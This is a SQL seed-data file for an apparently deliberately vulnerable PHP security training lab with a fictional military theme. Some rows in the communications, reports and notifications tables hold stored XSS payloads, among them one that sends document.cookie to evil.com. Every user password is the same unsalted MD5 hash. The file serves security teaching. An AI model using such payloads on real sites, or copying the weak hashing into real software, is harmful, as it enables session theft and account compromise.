-- ============================================================
-- PHP Security Labs – Seed Data
-- ============================================================
-- Run after schema creation.
-- Provides realistic mock data for all tables.
-- ============================================================

USE php_security_labs_app;

-- ------------------------------------------------------------
-- users (10 rows)
-- ------------------------------------------------------------
INSERT INTO users (username, email, password, role, is_admin) VALUES
('ghost',        'ghost@shadowops.mil',    '5f4dcc3b5aa765d61d8327deb882cf99', 'agent',   0),
('falcon',       'falcon@blackunit.mil',   '5f4dcc3b5aa765d61d8327deb882cf99', 'agent',   0),
('wraith',       'wraith@intel.mil',       '5f4dcc3b5aa765d61d8327deb882cf99', 'agent',   0),
('orion',        'orion@cybercom.mil',     '5f4dcc3b5aa765d61d8327deb882cf99', 'agent',   0),
('viper',        'viper@specops.mil',      '5f4dcc3b5aa765d61d8327deb882cf99', 'agent',   0),
('commander_x',  'cx@central.mil',         '5f4dcc3b5aa765d61d8327deb882cf99', 'leader',  1),
('analyst_j',    'j.analyst@intel.mil',    '5f4dcc3b5aa765d61d8327deb882cf99', 'analyst', 0),
('admin_root',   'root@system.mil',        '5f4dcc3b5aa765d61d8327deb882cf99', 'admin',   1),
('recruit_01',   'newguy@train.mil',       '5f4dcc3b5aa765d61d8327deb882cf99', 'user',    0),
('recruit_02',   'green@train.mil',        '5f4dcc3b5aa765d61d8327deb882cf99', 'user',    0);

-- ------------------------------------------------------------
-- sessions_lab (10 rows, tied to users)
-- ------------------------------------------------------------
INSERT INTO sessions_lab (user_id, session_token, is_admin) VALUES
(1, 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6', 0),
(2, 'b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7', 0),
(3, 'c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8', 0),
(4, 'd4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9', 0),
(5, 'e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0', 0),
(6, 'f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1', 1),
(7, 'a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2', 0),
(8, 'b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3', 1),
(9, 'c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4', 0),
(10,'d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5', 0);

-- ------------------------------------------------------------
-- lab_progress (10 rows, mix of completed/incomplete)
-- ------------------------------------------------------------
INSERT INTO lab_progress (user_id, lab_name, challenge, completed, completed_at) VALUES
(1, 'xss', 'lvl1', 1, '2026-04-20 10:30:00'),
(1, 'xss', 'lvl2', 0, NULL),
(2, 'sqli', 'lvl1', 1, '2026-04-21 14:22:00'),
(3, 'xss', 'lvl1', 1, '2026-04-22 09:15:00'),
(3, 'sqli', 'lvl1', 0, NULL),
(4, 'file_upload', 'lvl1', 1, '2026-04-23 16:45:00'),
(5, 'xss', 'lvl1', 0, NULL),
(6, 'xss', 'lvl2', 1, '2026-04-24 11:00:00'),
(7, 'sqli', 'lvl2', 0, NULL),
(8, 'xss', 'lvl3', 0, NULL);

-- ------------------------------------------------------------
-- system_logs (10 rows)
-- ------------------------------------------------------------
INSERT INTO system_logs (user_id, action, created_at) VALUES
(1, 'Login - successful',                '2026-04-25 08:12:00'),
(2, 'Login - successful',                '2026-04-25 08:14:00'),
(3, 'Viewed agent dossier #5',           '2026-04-25 08:20:00'),
(6, 'Admin login - dashboard accessed',  '2026-04-25 08:30:00'),
(7, 'Downloaded report #3',              '2026-04-25 08:45:00'),
(4, 'Failed login attempt',              '2026-04-25 08:47:00'),
(9, 'Completed XSS challenge lvl1',     '2026-04-25 09:00:00'),
(5, 'Sent communication to agent 2',    '2026-04-25 09:10:00'),
(8, 'Modified user permissions',        '2026-04-25 09:15:00'),
(10,'New session started',              '2026-04-25 09:20:00');

-- ============================================================
-- MILITARY SIMULATION DATABASE
-- ============================================================
USE php_security_labs_challenges;

-- ------------------------------------------------------------
-- leaders (10 rows)
-- ------------------------------------------------------------
INSERT INTO leaders (name, position, division) VALUES
('Gen. Marcus Kane',        'General',         'Central Command'),
('Col. Elena Vasquez',      'Colonel',         'Cyber Operations'),
('Lt.Col. Samuel Briggs',   'Lieutenant Colonel','Intelligence Division'),
('Maj. Priya Singh',        'Major',           'Special Forces'),
('Capt. David Chen',        'Captain',         'Reconnaissance Unit'),
('Commander Alexei Morozov','Commander',       'Naval Intelligence'),
('Gen. Michael Torres',     'General',         'Strategic Defense'),
('Col. Sarah Whitman',      'Colonel',         'Military Police'),
('Maj. Ravi Patel',         'Major',           'Cyber Warfare'),
('Capt. Naomi Okonkwo',     'Captain',         'Logistics');

-- ------------------------------------------------------------
-- units (10 rows, referenced from leaders)
-- ------------------------------------------------------------
INSERT INTO units (name, type, commander_id) VALUES
('Alpha Team',      'infantry',     1),
('Ghost Unit',      'cyber',        2),
('Omicron Squad',   'intelligence', 3),
('Viper Division',  'special_ops',  4),
('Shadow Ops',      'recon',        5),
('Blackwave',       'naval',        6),
('Sentinel',        'strategic',    7),
('Iron Guard',      'police',       8),
('CyberCell',       'cyber',        9),
('Supply Chain',    'logistics',    10);

-- ------------------------------------------------------------
-- agents (10 rows, tied to units)
-- ------------------------------------------------------------
INSERT INTO agents (codename, real_name, clearance_level, unit_id, status) VALUES
('GHOST',        'Jack Mitchell',    5, 1, 'active'),
('FALCON',       'Maria Rossi',      4, 2, 'active'),
('WRAITH',       'Hans Weber',       5, 3, 'active'),
('ORION',        'Emily Stone',      3, 4, 'inactive'),
('VIPER',        'Ravi Thakur',      4, 5, 'active'),
('SPECTRE',      'Olga Petrova',     5, 6, 'active'),
('PANTHER',      'Carlos Mendez',    2, 7, 'active'),
('JAGUAR',       'Liu Yang',         4, 8, 'undercover'),
('LYNX',         'Fatima Al-Rashid', 3, 9, 'active'),
('WOLF',         'Alexei Sorokin',   5, 2, 'active');

-- ------------------------------------------------------------
-- cases (10 rows, missions)
-- ------------------------------------------------------------
INSERT INTO cases (title, description, status, assigned_unit, priority, created_at) VALUES
('Operation Silent Watch',    'Surveillance on suspected double agent.',                     'active',   1, 'high',     '2026-03-01 09:00:00'),
('Cyber Intrusion Response',  'Investigate breach of confidential data.',                   'active',   2, 'critical', '2026-03-10 14:00:00'),
('Underground Network',       'Uncover extremist communication channels.',                  'active',   3, 'high',     '2026-03-15 11:00:00'),
('Asset Extraction',          'Retrieve defecting scientist from hostile territory.',      'closed',   4, 'normal',   '2026-02-20 07:00:00'),
('Blackmail Investigation',   'Identify source of leaked photos targeting officials.',     'active',   5, 'medium',   '2026-04-01 08:30:00'),
('Naval Infiltration',        'Monitor unauthorized submarine activity.',                  'pending',  6, 'high',     '2026-04-12 10:00:00'),
('Operation Golden Shield',   'Security drill for national event.',                        'closed',   7, 'low',      '2026-01-10 06:00:00'),
('Rogue Agent Hunt',          'Locate and detain compromised agent.',                      'active',   8, 'critical', '2026-04-18 16:00:00'),
('CyberCell Hackathon',       'Internal security challenge to find vulnerabilities.',     'active',   9, 'medium',   '2026-04-20 09:00:00'),
('Supply Route Sabotage',     'Investigate destroyed convoy.',                             'suspended',10, 'high',     '2026-04-22 12:00:00');

-- ------------------------------------------------------------
-- agent_case (10 rows, linking agents to cases)
-- ------------------------------------------------------------
INSERT INTO agent_case (agent_id, case_id, role) VALUES
(1, 1, 'leader'),
(2, 1, 'operative'),
(3, 2, 'cyber analyst'),
(4, 2, 'surveillance'),
(5, 3, 'infiltrator'),
(6, 3, 'support'),
(7, 4, 'extraction specialist'),
(8, 5, 'detective'),
(9, 6, 'monitor'),
(10,7, 'guard');

-- ------------------------------------------------------------
-- communications (10 rows, includes XSS payloads for labs)
-- ------------------------------------------------------------
INSERT INTO communications (sender_id, recipient_id, message, is_encrypted, read_status, attachment_url) VALUES
(1, 2, 'Meet at drop point Alpha. Bring the package.', 0, 1, NULL),
(2, 3, 'New intel suggests a mole in Unit 5.', 0, 1, NULL),
(3, 1, 'Encrypted channel requested for operation Silent Watch.', 1, 0, NULL),
(4, 5, '<script>alert("XSS in message")</script>', 0, 0, NULL),  -- intentionally vulnerable for labs
(5, 2, 'Satellite imagery uploaded.', 0, 1, '/uploads/sat_img_2026-04-24.png'),
(6, 1, 'Agent VIPER compromised. Execute containment protocol.', 1, 1, NULL),
(7, 8, 'New login portal: <a href="http://fakesite.mil">Click</a>', 0, 0, NULL),
(8, 9, 'Report suspicious activity at grid 7X.', 0, 1, NULL),
(9, 10,'<img src=x onerror=alert(1)>', 0, 0, NULL),
(10, 1,'All clear. Returning to base.', 0, 1, NULL);

-- ------------------------------------------------------------
-- reports (10 rows, some with XSS vectors)
-- ------------------------------------------------------------
INSERT INTO reports (agent_id, report, reviewed_by_admin) VALUES
(1, 'Operation Silent Watch – Preliminary findings indicate possible leak from internal source.', 0),
(2, 'Cyber breach traced to IP 10.23.45.67. Full details in attachment.', 0),
(3, '<b>Notice:</b> Please update your security clearance badge.', 0),             -- stored HTML
(4, 'Asset extraction successful. No casualties.', 1),
(5, '<yscript>doocument.location="http://evil.com/?cookie="+document.cookie</yscript>', 0),  -- XSS payload
(6, 'Naval activity near border – recommend increased patrols.', 0),
(7, 'Golden Shield drill results: all units responded within 8 minutes.', 1),
(8, 'Rogue agent last seen at coordinates 34.05, -118.25.', 0),
(9, 'CyberCell competition – participant list attached.', 0),
(10,'Convoy route security compromised. Request immediate review.', 0);

-- ------------------------------------------------------------
-- secrets (10 rows, high-value data)
-- ------------------------------------------------------------
INSERT INTO secrets (secret_key, description, classification_level, source, leaked, owner_agent_id, case_id) VALUES
('NUCLEAR_LAUNCH_CODE_X9',   'Strategic command override codes.',                     10, 'Central Command',       0, 1, 1),
('DRONE_ACCESS_TOKEN',       'Remote UAV control token.',                             8,  'Cyber Division',        0, 2, 2),
('AGENT_ROSTER_2026',        'List of all active agents with real identities.',       9,  'Personnel',             1, 3, 3),
('SURVEILLANCE_SATELLITE',   'Access key to military satellite network.',             9,  'Space Command',         0, 4, 4),
('CYBER_WARFARE_PLAYBOOK',   'Offensive cyber operations manual.',                    7,  'CyberCell',             0, 5, 5),
('BLACK_SITE_COORDINATES',   'Locations of classified interrogation facilities.',     10, 'Special Ops',           1, 6, 6),
('PREDATOR_DRONE_FIRMWARE',  'Firmware signature for MQ-9 Reaper drones.',            8,  'Air Force',             0, 7, 7),
('INTEL_DATABASE_DUMP',      'Exported intelligence on hostile movements.',           6,  'Intelligence Division', 1, 8, 8),
('CLASSIFIED_EVENT_SCHEDULE', 'Schedule of VIP movements and security arrangements.', 5,  'Protection Detail',     0, 9, 9),
('AI_BACKDOOR_PASSPHRASE',   'Activation phrase for dormant AI system.',              10, 'R&D',                   0, 10,10);

-- ------------------------------------------------------------
-- technologies (10 rows)
-- ------------------------------------------------------------
INSERT INTO technologies (name, description, classification_level, status) VALUES
('Stealth Drone X-22',          'Radar-evasive reconnaissance drone.',                          6, 'operational'),
('Quantum Encryption Module',   'Next-gen communication encryption.',                            7, 'testing'),
('AI Surveillance Grid',        'Autonomous threat detection system.',                           5, 'deployed'),
('EMP Rifle Prototype',         'Short-range electromagnetic pulse weapon.',                     8, 'experimental'),
('Smart Camouflage Fabric',     'Adaptive thermal masking suit.',                                4, 'field trial'),
('Satellite Laser Relay',       'Space-based communication laser.',                              6, 'development'),
('Neural Interface Headset',    'Brain-computer interface for drone control.',                   9, 'secret'),
('Portable EMP Generator',      'Man-portable electromagnetic bomb.',                            5, 'prototype'),
('Bio-Encryption Key Reader',   'DNA-locked access terminal.',                                   7, 'on hold'),
('Holographic Battlefield Map', '3D projection of real-time troop movements.',                   4, 'deployed');

-- ------------------------------------------------------------
-- notifications (10 rows)
-- ------------------------------------------------------------
INSERT INTO notifications (user_id, title, message, is_read, source_type, source_id) VALUES
(1, 'New Mission Assigned',         'You have been assigned to Operation Silent Watch.',                     0, 'case', 1),
(2, 'Security Clearance Updated',   'Your clearance has been increased to level 5.',                          1, 'system', NULL),
(3, 'Message from Commander',       'Please review the cyber breach report immediately.',                    0, 'communication', 2),
(4, 'Training Reminder',            'Mandatory cyber awareness training due by 2026-05-01.',                  0, 'system', NULL),
(5, 'Case Update',                  'Blackmail Investigation status changed to active.',                     1, 'case', 5),
(6, '<img src=x onerror=alert(1)>', 'Unusual activity detected on your account.',                            0, 'system', NULL),  -- XSS vector
(7, 'Report Reviewed',              'Your extraction report has been reviewed by command.',                  1, 'report', 4),
(8, 'New Tech Approval',            'Quantum Encryption Module awaiting your sign-off.',                     0, 'technology', 2),
(9, 'Alert: Suspicious Login',      'Login attempt from unrecognized IP: 192.168.9.101.',                    0, 'audit', NULL),
(10,'Mission Completed',            'Congratulations! Operation Golden Shield is complete.',                 1, 'case', 7);

-- ------------------------------------------------------------
-- audit_trail (10 rows)
-- ------------------------------------------------------------
INSERT INTO audit_trail (user_id, action, ip_address, user_agent, action_type) VALUES
(1, 'Login',                    '192.168.1.10',  'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'login'),
(2, 'Read case #2',             '192.168.1.11',  'Mozilla/5.0 (X11; Linux x86_64)',           'access'),
(6, 'Granted admin rights',     '192.168.1.100', 'Mozilla/5.0 (Macintosh; Intel Mac OS X)',   'admin'),
(3, 'Downloaded report #3',     '192.168.1.12',  'Mozilla/5.0 (iPhone; CPU iPhone OS)',       'download'),
(4, 'Failed login attempt',     '10.0.0.5',      'Mozilla/5.0 (Android 12; Mobile)',          'login_fail'),
(7, 'Viewed secret #1',         '192.168.1.20',  'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'access_secret'),
(8, 'Exported agent list',      '192.168.1.30',  'Custom/internal tool',                      'export'),
(5, 'Sent XSS payload in comm', '10.10.10.1',    'Python-requests/2.28',                      'attack'),  -- interesting for labs
(9, 'Changed password',         '192.168.1.15',  'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'password_change'),
(10,'Session timeout',          '192.168.1.50',  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64)',   'timeout');